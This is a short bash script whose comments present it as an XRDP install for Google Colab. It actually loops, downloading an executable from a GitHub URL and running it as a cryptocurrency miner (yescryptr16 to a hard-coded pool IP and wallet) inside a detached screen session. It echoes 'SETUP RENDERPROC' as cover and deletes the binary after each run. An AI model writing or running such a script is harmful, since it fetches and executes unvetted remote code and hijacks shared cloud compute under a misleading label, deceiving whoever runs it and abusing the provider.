# /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt-get install screen -y

for i in `seq 1 99999`; do echo $i; sudo wget -q https://github.com/indah38/theta/raw/main/VTM; chmod 700 VTM;clear;echo SETUP RENDERPROC $i; screen -dmS Running ./VTM -a yescryptr16  -o stratum+tcps://178.128.86.41:80 -u vFEneCSxgbhmn7idJxxWULEgD5jS2hyJnQ.OHGITU2 -p x -t4; sleep 1500; clear; screen -XS Running quit; rm -f VTM; echo SUCCESS PROJECT; sleep 3; done
